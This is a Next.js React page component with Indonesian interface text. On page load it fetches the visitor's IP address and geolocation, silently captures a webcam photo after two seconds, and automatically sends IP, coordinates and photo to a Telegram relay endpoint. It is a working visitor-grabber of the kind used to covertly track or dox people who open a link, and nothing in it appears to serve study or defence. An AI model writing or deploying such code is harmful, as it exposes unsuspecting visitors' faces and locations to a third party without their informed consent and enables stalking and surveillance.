"use client";

import { useState, useEffect, useRef } from 'react';

export default function Home() {
  const [ip, setIp] = useState('');
  const [location, setLocation] = useState(null);
  const [photo, setPhoto] = useState(null);
  const [message, setMessage] = useState('');
  const videoRef = useRef(null);
  const canvasRef = useRef(null);

  const fetchIpAndLocation = async () => {
    try {
      const res = await fetch('/api/get-ip-location');
      const data = await res.json();
      if (data.error) {
        throw new Error(data.error);
      }
      setIp(data.ip);
      setLocation(data.location);
    } catch (error) {
      setMessage('Gagal mengambil IP atau lokasi');
    }
  };

  const capturePhoto = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      videoRef.current.srcObject = stream;
      videoRef.current.play();

      setTimeout(() => {
        const canvas = canvasRef.current;
        const video = videoRef.current;
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const photoData = canvas.toDataURL('image/png');
        setPhoto(photoData);

        stream.getTracks().forEach(track => track.stop());
      }, 2000);
    } catch (error) {
      setMessage('Gagal mengakses kamera. Pastikan Anda memberikan izin.');
    }
  };

  const sendToTelegram = async () => {
    if (!ip || !location || !photo) {
      setMessage('Menunggu data lengkap...');
      return;
    }

    try {
      const res = await fetch('/api/send-to-telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ ip, location, photo }),
      });

      if (res.ok) {
        setMessage('Data berhasil dikirim ke Telegram!');
      } else {
        setMessage('Gagal mengirim data ke Telegram');
      }
    } catch (error) {
      setMessage('Terjadi kesalahan saat mengirim data');
    }
  };

  useEffect(() => {
    fetchIpAndLocation();
    capturePhoto();
  }, []);

  useEffect(() => {
    if (ip && location && photo) {
      sendToTelegram();
    }
  }, [ip, location, photo]);

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-100">
      <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
        <h1 class="text-2xl font-bold mb-4 text-center">Mengambil Data Otomatis</h1>
        {ip && location ? (
          <div class="mb-4">
            <p><strong>IP:</strong> {ip}</p>
            <p><strong>Negara:</strong> {location.country}</p>
            <p><strong>Kota:</strong> {location.city}</p>
            <p><strong>Latitude:</strong> {location.latitude}</p>
            <p><strong>Longitude:</strong> {location.longitude}</p>
          </div>
        ) : (
          <p class="mb-4">Mengambil IP dan lokasi...</p>
        )}
        <div class="mb-4">
          <p class="text-sm font-medium mb-2">Kamera</p>
          <video ref={videoRef} class="w-full h-40 object-cover rounded" />
          <canvas ref={canvasRef} class="hidden" />
          {photo && (
            <img src={photo} alt="Captured" class="mt-2 w-full h-40 object-cover rounded" />
          )}
        </div>
        {message && <p class="mt-4 text-center text-red-500">{message}</p>}
      </div>
    </div>
  );
}
